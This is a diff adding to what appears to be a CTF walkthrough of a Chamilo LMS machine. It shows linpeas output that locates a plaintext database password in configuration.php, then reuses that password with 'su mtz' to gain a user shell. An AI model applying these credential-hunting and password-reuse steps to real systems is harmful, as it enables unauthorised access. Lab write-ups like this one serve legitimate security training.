@@ -197,5 +197,43 @@ CVE: `https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS`
 
 linpeas output:
 ```bash
+╔══════════╣ Users with console
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+root:x:0:0:root:/root:/bin/bash
 
+╔══════════╣ Searching passwords in config PHP files
+/var/www/chamilo/app/config/configuration.php:                'show_password_field' => false,
+/var/www/chamilo/app/config/configuration.php:                'show_password_field' => true,
+/var/www/chamilo/app/config/configuration.php:        'wget_password' => '',
+/var/www/chamilo/app/config/configuration.php:    'force_different_password' => false,
+/var/www/chamilo/app/config/configuration.php:$_configuration['auth_password_links'] = [
+/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+/var/www/chamilo/app/config/configuration.php:$_configuration['password_encryption'] = 'bcrypt';
+/var/www/chamilo/app/config/configuration.php:/*$_configuration['password_requirements'] = [
+/var/www/chamilo/app/config/configuration.php://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
+/var/www/chamilo/app/config/configuration.php://$_configuration['force_renew_password_at_first_login'] = true;
+/var/www/chamilo/app/config/configuration.php://$_configuration['password_conversion'] = false;
+/var/www/chamilo/cli-config.php:    'password' => $_configuration['db_password'],
+/var/www/chamilo/main/admin/db.php:';if($Qd=="auth"){$Ce="";foreach((array)$_SESSION["pwds"]as$mh=>$Mf){foreach($Mf
+/var/www/chamilo/main/admin/db.php:<tr><th>Password<td><input name="pass" id="pass" value="',h($L["pass"]),'" autocomplete="new-password">
+/var/www/chamilo/main/install/configuration.dist.php:                'show_password_field' => false,
+/var/www/chamilo/main/install/configuration.dist.php:                'show_password_field' => true,
+/var/www/chamilo/main/install/configuration.dist.php:        'wget_password' => '',
+/var/www/chamilo/main/install/configuration.dist.php:    'force_different_password' => false,
+/var/www/chamilo/main/install/configuration.dist.php:$_configuration['auth_password_links'] = [
+/var/www/chamilo/main/install/configuration.dist.php:$_configuration['db_password'] = '{DATABASE_PASSWORD}';
+/var/www/chamilo/main/install/configuration.dist.php:$_configuration['password_encryption'] = '{ENCRYPT_PASSWORD}';
+/var/www/chamilo/main/install/configuration.dist.php:/*$_configuration['password_requirements'] = [
+/var/www/chamilo/main/install/configuration.dist.php://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
+/var/www/chamilo/main/install/configuration.dist.php://$_configuration['force_renew_password_at_first_login'] = true;
+/var/www/chamilo/main/install/configuration.dist.php://$_configuration['password_conversion'] = false;
+/var/www/chamilo/main/install/update-configuration.inc.php:        } elseif (stripos($line, '$userPasswordCrypted') !== false) {
+/var/www/chamilo/plugin/buycourses/database.php:        'password' => '',
+/var/www/chamilo/plugin/buycourses/database.php:    $paypalTable->addColumn('password', Types::STRING);
+```
+
+Using linpeas output, login as user `mtz` with db_password `03F6lY3uXAP2bkW8`
+```bash
+su mtz
+Password: 03F6lY3uXAP2bkW8
 ```
